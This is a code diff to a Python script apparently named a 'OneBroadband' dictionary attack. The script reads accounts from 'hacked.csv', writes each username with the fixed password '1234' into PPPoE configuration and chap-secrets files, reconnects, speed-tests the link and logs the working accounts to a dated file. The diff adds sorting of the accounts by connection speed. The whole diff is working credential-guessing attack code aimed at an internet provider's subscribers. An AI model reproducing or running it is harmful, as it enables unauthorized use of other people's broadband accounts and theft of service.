@@ -5,6 +5,7 @@ import multiprocessing as mp
 from tqdm import *
 import time
 import speedtest
+from datetime import datetime
 
 TESTED = []
 dsl = 'noipdefault\ndefaultroute\nreplacedefaultroute\nhide-password\nnoauth\npersist\nplugin rp-pppoe.so eth0\nuser "{}"\nusepeerdns'
@@ -52,11 +53,33 @@ def test_speed():
     return '{:.2f} MB/s'.format(res["download"] / 8000000)
 
 
+def get_speed(speed):
+    speed = speed[:speed.index('Mbps')]
+    temp = speed.rindex('_')
+    speed = speed[speed.rindex('_') + 1:]
+    return speed
+
+
+def _sort(e):
+    return e[2]
+
+
 def test_username():
     dict_path = input('Enter the dictionary filepath: ')
     if os.path.isfile(dict_path):
+        accounts = []
         for i in open('hacked.csv', 'r').readlines():
-            account = i.split(',')
+            try:
+                acc = i.split(',')
+                acc[2] = get_speed(acc[2])
+                accounts.append(acc)
+            except:
+                pass
+
+        accounts.sort(reverse=True, key=lambda x: x[2])
+
+        for account in accounts:
+            # account = i.split(',')
             print(str(account))
             os.system('poff -a')
             os.system('ifconfig eth0 down')
@@ -64,18 +87,20 @@ def test_username():
             os.system('ifconfig eth0 up')
             with open('/etc/ppp/peers/dsl-provider', 'w') as f:
                 f.write(dsl.format(account[0]))
-            with open('/etc/ppp/chap-secrets','w') as f:
+            with open('/etc/ppp/chap-secrets', 'w') as f:
                 f.write(f'"{account[0]}" * "1234"')
             os.system('pon dsl-provider')
             time.sleep(15)
-            
+
             retry = 5
             connected = False
             connected_account: str
             while connected != True & retry > 0:
                 try:
-                    speed=test_speed()
-                    write('/home/pi/OneBroadband_DictinaryAttack/succesfull.csv', f'{i[:-1]},{speed}\n')
+                    speed = test_speed()
+                    write(
+                        f'/home/pi/OneBroadband_DictinaryAttack/succesfull{datetime.today().strftime("%Y-%m-%d")}.csv',
+                        f'{i[:-1]},{speed}\n')
                     connected = True
                     print(f'{account[0]} {speed}')
                 except Exception as e:
